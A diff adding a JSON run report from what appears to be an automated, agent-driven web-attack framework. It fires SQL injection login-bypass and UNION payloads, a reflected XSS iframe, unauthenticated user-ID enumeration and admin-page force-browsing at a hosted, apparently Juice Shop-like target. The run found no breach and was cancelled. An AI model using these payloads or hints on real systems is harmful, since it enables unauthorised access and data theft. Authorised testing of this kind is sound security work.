@@ -1,0 +1,163 @@
+{
+  "run_id": "r1779576152",
+  "target_url": "https://docker-image-production-c431.up.railway.app/",
+  "started_at": "2026-05-23T22:42:32Z",
+  "finished_at": "2026-05-23T22:47:30Z",
+  "duration_s": 297.935797891,
+  "generations_run": 1,
+  "total_pods": 5,
+  "outcome": "EXHAUSTED",
+  "best_fitness": 0,
+  "breach": null,
+  "per_generation": [
+    {
+      "generation": 1,
+      "population": 5,
+      "survivors": 0,
+      "best_fitness": 0,
+      "breaches": 0,
+      "per_pod": [
+        {
+          "Genome": {
+            "vector": "sqli_login",
+            "category": "injection",
+            "technique": "tautology",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' OR 1=1--",
+              "password": "x"
+            },
+            "hint": "Try classic auth bypass via SQL tautology in email field."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779576152",
+            "pod_id": "r1779576152-g1-p0",
+            "generation": 1,
+            "vector": "sqli_login",
+            "category": "injection",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi finished without emitting a result line",
+            "raw_findings": [],
+            "duration_ms": 67000,
+            "t": 1779576221322
+          },
+          "Fitness": 0,
+          "PodID": "r1779576152-g1-p0"
+        },
+        {
+          "Genome": {
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "technique": "union_select",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' UNION SELECT 1,2,3,4,5--"
+            },
+            "hint": "Try UNION-based info leak."
+          },
+          "Result": {
+            "type": "",
+            "run_id": "",
+            "pod_id": "",
+            "generation": 0,
+            "vector": "",
+            "category": "",
+            "status": "ERROR",
+            "fitness": 0,
+            "evidence": "spawn.RunPod: wait: k8s.WaitForCompletion: openzerg/openzerg-attacker-r1779576152-g1-p1: context canceled",
+            "raw_findings": null,
+            "duration_ms": 0,
+            "t": 0
+          },
+          "Fitness": 0,
+          "PodID": "r1779576152-g1-p1"
+        },
+        {
+          "Genome": {
+            "vector": "xss_search_reflected",
+            "category": "xss",
+            "technique": "reflected",
+            "target_path": "/#/search",
+            "params": {
+              "q": "\u003ciframe src=javascript:alert(1)\u003e"
+            },
+            "hint": "Try reflected XSS via search query parameter."
+          },
+          "Result": {
+            "type": "",
+            "run_id": "",
+            "pod_id": "",
+            "generation": 0,
+            "vector": "",
+            "category": "",
+            "status": "ERROR",
+            "fitness": 0,
+            "evidence": "spawn.RunPod: wait: k8s.WaitForCompletion: openzerg/openzerg-attacker-r1779576152-g1-p2: context canceled",
+            "raw_findings": null,
+            "duration_ms": 0,
+            "t": 0
+          },
+          "Fitness": 0,
+          "PodID": "r1779576152-g1-p2"
+        },
+        {
+          "Genome": {
+            "vector": "bola_users",
+            "category": "access_control",
+            "technique": "id_enumeration",
+            "target_path": "/api/Users/1",
+            "params": {},
+            "hint": "Try fetching admin user by ID without auth."
+          },
+          "Result": {
+            "type": "",
+            "run_id": "",
+            "pod_id": "",
+            "generation": 0,
+            "vector": "",
+            "category": "",
+            "status": "ERROR",
+            "fitness": 0,
+            "evidence": "spawn.RunPod: wait: k8s.WaitForCompletion: openzerg/openzerg-attacker-r1779576152-g1-p3: context canceled",
+            "raw_findings": null,
+            "duration_ms": 0,
+            "t": 0
+          },
+          "Fitness": 0,
+          "PodID": "r1779576152-g1-p3"
+        },
+        {
+          "Genome": {
+            "vector": "admin_section",
+            "category": "access_control",
+            "technique": "force_browse",
+            "target_path": "/#/administration",
+            "params": {},
+            "hint": "Try to reach admin UI directly.",
+            "requires_nimble": true
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779576152",
+            "pod_id": "r1779576152-g1-p4",
+            "generation": 1,
+            "vector": "admin_section",
+            "category": "access_control",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi finished without emitting a result line",
+            "raw_findings": [],
+            "duration_ms": 96000,
+            "t": 1779576250915
+          },
+          "Fitness": 0,
+          "PodID": "r1779576152-g1-p4"
+        }
+      ]
+    }
+  ],
+  "narrative_md_path": "out/summary-r1779576152.md",
+  "cancelled": true
+}
